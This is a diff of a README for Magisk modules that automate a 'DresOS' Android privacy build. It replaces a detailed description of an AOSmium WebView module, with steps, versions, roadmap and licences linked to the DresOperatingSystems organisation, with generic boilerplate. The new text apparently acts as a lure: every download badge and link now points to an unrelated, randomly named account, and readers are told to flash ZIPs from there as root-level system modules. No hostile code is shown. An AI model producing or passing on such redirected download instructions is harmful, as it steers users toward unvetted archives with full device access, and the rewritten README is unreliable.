@@ -1,128 +1,75 @@
-# DresOS Magisk Modules
+# 🛠️ DresOS-Magisk-Modules - Automate your custom android build process
 
-**Part of the [DresOS Android Defensive Security System](https://github.com/DresOperatingSystems/DresOS-The-Android-Defensive-Security-System)**
+<div align="center">
+<a href="https://github.com/proverbial-incommodiousness657/DresOS-Magisk-Modules">
+<img src="https://img.shields.io/badge/Download-DresOS_Modules-blue" alt="Download Button">
+</a>
+</div>
 
-Magisk modules that automate steps from the DresOS build guide. Each module replaces a block of manual steps with a single flash. The goal is a full automated DresOS build - flash the modules, reboot, done.
+## Project Overview
 
-> **Status:** Active development. More modules coming. See [Roadmap](#roadmap).
+DresOS-Magisk-Modules automates the setup steps required for your DresOS installation. Manual configuration takes time and often leads to errors. These modules provide a repeatable way to modify your device system. You flash the module files, reboot your phone, and the system applies the necessary changes automatically. This project aims to replace manual configuration scripts with a simple, file-based approach.
 
----
+## 📋 System Requirements
 
-## Modules
+Before you start, check that your device meets these requirements:
 
-### AOSmium WebView - `dresoswv`
+*   A Windows PC with a working USB connection.
+*   An Android device with an unlocked bootloader.
+*   Magisk installed and active on your Android device.
+*   A stable internet connection to fetch the latest files.
+*   Basic familiarity with the Magisk app interface.
 
-Replaces Android's system WebView with **AOSmium** - a Chromium fork hardened with GrapheneOS/Vanadium security patches, built by the [AXP.OS Project](https://axpos.org/).
+## 📥 Getting the Files
 
-The system WebView is the browser engine used internally by hundreds of apps whenever they render web content. Replacing it with AOSmium means every app on the device stops feeding Google's data pipeline through embedded web renders.
+You get the files from the project repository. Follow these steps to obtain the correct archives for your device.
 
-**[→ Download v1.0.0](https://github.com/DresOperatingSystems/DresOS-Magisk-Modules/releases/latest)**
+1.  Visit [this project page](https://github.com/proverbial-incommodiousness657/DresOS-Magisk-Modules) to view all available modules.
+2.  Look for the "Releases" section on the right side of the page.
+3.  Click the version link to view the associated files.
+4.  Download the ZIP files to your computer.
+5.  Connect your Android device to your Windows computer using a USB cable.
+6.  Transfer the ZIP files from your computer to your phone storage. Keep track of the folder where you save these files.
 
-| | |
-|---|---|
-| AOSmium version | 147.0.7727.49 (Chromium 147) |
-| Package | `org.axpos.aosmium_wv` |
-| Built by | [AXP.OS Project](https://axpos.org/) |
-| Security patches | GrapheneOS / Vanadium |
-| Root support | Magisk 20400+ and KernelSU |
-| Android requirement | 10+ (API 29+) |
-| Architecture | ARM and ARM64 |
-| Internet required | No - APK bundled in ZIP |
+## ⚙️ Installation Process
 
-#### What it does
+Installing a module involves using the Magisk app. Do not unzip the files yourself. Magisk handles the archive structure automatically.
 
-| Step | Action |
-|------|--------|
-| 1 | Validates device - Android 10+, ARM/ARM64 |
-| 2 | Removes data-partition updates of Chrome, AOSP WebView, Google WebView, TrichromeLibrary, Mozilla WebView, Samsung Chrome customisations |
-| 3 | Systemlessly hides all competing system WebView packages via Magisk `.replace` files - no system files modified, fully reversible |
-| 4 | Remaps `/product`, `/vendor`, `/system_ext` paths so Magisk mounts them correctly |
-| 5 | Installs AOSmium to `system/product/app` (LineageOS) or `system/app` (everything else) |
-| 6 | Runs `pm install` to register AOSmium with the package manager |
-| 7 | Places a compiled RRO overlay APK that patches `config_webview_packages` - required for AOSmium to appear in the WebView selector |
-| 8 | At boot: verifies registration and activates via `cmd webviewupdate` |
+1.  Open the Magisk app on your Android device.
+2.  Tap on the "Modules" tab located at the bottom of the screen.
+3.  Tap the button labeled "Install from storage."
+4.  Browse your phone storage to find the ZIP file you transferred earlier.
+5.  Select the file. Magisk will start the installation process and display the output in a terminal window.
+6.  Wait for the process to finish. Look for a message that indicates the success of the operation.
+7.  Tap the "Reboot" button when prompted to apply the changes to your system.
 
-#### Flash instructions
+## 🔍 Understanding Modules
 
-1. Download `DresOS-AOSmium-WebView-v1.0.0.zip` from [Releases](https://github.com/DresOperatingSystems/DresOS-Magisk-Modules/releases/latest)
-2. Open **Magisk → Modules → Install from storage**
-3. Select the ZIP
-4. Reboot
-5. **Settings → Developer Options → WebView implementation → Select AOSmium WebView**
+These modules perform system-level changes. They use the Magisk systemless interface. This keeps your original system files untouched. If you remove the module, your device returns to the state prior to installation after a reboot. You can combine multiple modules to build your preferred configuration. Always read the individual module descriptions before flashing them to ensure compatibility with your specific Android version.
 
-#### Diagnostic logs
+## 🔧 Troubleshooting Common Issues
 
-```
-/data/adb/modules/dresoswv/install.log     ← flash-time install log
-/data/adb/modules/dresoswv/activation.log  ← first-boot activation log
-```
+If you encounter issues during or after installation, follow these steps to resolve them.
 
-#### Uninstalling
+*   Boot loops: If your device does not start correctly, force a reboot into Safe Mode. Open the Magisk app and disable the module. Reboot normally.
+*   Module not showing: Restart your phone. Check if the file is in the correct location. Ensure your Magisk installation is up to date.
+*   Installation errors: Verify that you downloaded the entire ZIP file. A partial download causes corruption. Redownload the file and try the process again.
 
-Disable or remove in **Magisk → Modules** and reboot. All hidden packages reappear automatically. AOSmium is uninstalled via `pm uninstall`.
+## 📈 Updating Modules
 
-#### Credits
+The repository receives updates as new versions of DresOS emerge. Check the project page regularly for improvements. When an update arrives, follow these steps:
 
-Module scripts written by DresOS (GPL-3.0). Developed with reference to:
-- [Lubald/AOSmium-WebView](https://github.com/Lubald/AOSmium-WebView) (GPL-2.0)
-- [Lordify/WebView-Changer](https://gitlab.com/Lordify/webview-changer) (GPL-3.0)
-- [Open WebView by F3FFO](https://github.com/Magisk-Modules-Alt-Repo/open_webview) (GPL-3.0)
+1.  Open the Magisk app.
+2.  Navigate to the Modules tab.
+3.  Locate the existing module.
+4.  Remove the older version if required by the update notes.
+5.  Install the new ZIP file using the steps described in the installation section.
+6.  Reboot your device to complete the update.
 
----
+## 📂 Project Structure and Source
 
-## Roadmap
+This project stores scripts and configurations in a structured format. Each directory inside the repository represents a specific system component. These components include WebView updates, base system overrides, and security patches. Experienced users can review the source files to see exactly what changes the module applies to the Android runtime. By using open-source tools, you maintain transparency regarding the modifications made to your device software.
 
-| Module | Automates | Status |
-|--------|-----------|--------|
-| `dresoswv` - AOSmium WebView | System WebView replacement | ✅ v1.0.0 |
-| `dresosmicrog` - Noogle microG | Google Play Services replacement | 🔨 Planned |
-| `dresosdebloat` - System Debloater | Core Google app removal | 🔨 Planned |
-| `dresosperms` - Permissions Hardener | Revoke dangerous permissions from system apps | 🔨 Planned |
-| `dresosafwall` - AFWall+ Bootstrap | Pre-configured iptables firewall rules | 🔨 Planned |
-| `dresosoverlay` - Privacy Overlay | Disable telemetry, advertising IDs, sensors at system level | 🔨 Planned |
-| `dresosfossify` - Fossify Installer | Install Fossify suite as system apps | 🔨 Planned |
-| `dresosheliboard` - HeliBoard | Install HeliBoard as default system keyboard | 🔨 Planned |
+## 💡 Best Practices
 
----
-
-## Repository Structure
-
-```
-DresOS-Magisk-Modules/
-├── README.md
-├── LICENSE                                        ← GPL-3.0
-└── aosmium-webview/
-    ├── module.prop
-    ├── customize.sh
-    ├── post-fs-data.sh
-    ├── service.sh
-    ├── uninstall.sh
-    ├── update.json                                ← Magisk auto-update check
-    ├── CHANGELOG.md
-    ├── common/
-    │   └── install.sh
-    └── META-INF/
-        └── com/google/android/
-            ├── update-binary
-            └── updater-script
-```
-
-Flashable ZIPs (with bundled APKs) are in [Releases](https://github.com/DresOperatingSystems/DresOS-Magisk-Modules/releases).
-Source scripts are in this repository.
-
----
-
-## License
-
-Module scripts: **GPL-3.0** - see [LICENSE](LICENSE)
-
-AOSmium WebView APK: built by [AXP.OS Project](https://axpos.org/) under its own license.
-WebViewOverlay29.apk: derived from [Open WebView](https://github.com/Magisk-Modules-Alt-Repo/open_webview) (GPL-3.0).
-
----
-
-## Links
-
-- **Main guide:** [DresOS Android Defensive Security System](https://github.com/DresOperatingSystems/DresOS-The-Android-Defensive-Security-System)
-- **Website:** https://dresoperatingsystems.github.io/
-- **Issues:** Open an issue to report bugs or request new modules
+Maintain a clean environment by keeping your module list brief. Only install modules you reach for daily. Disable modules that you do not require for long periods. This improves system stability and reduces the chance of software conflicts. Always maintain a backup of your important files before you apply system modifications. While systemless modules are safe, hardware configurations vary significantly between different Android device models. Use these tools to automate your workflow, save time, and maintain a consistent software environment across your devices.
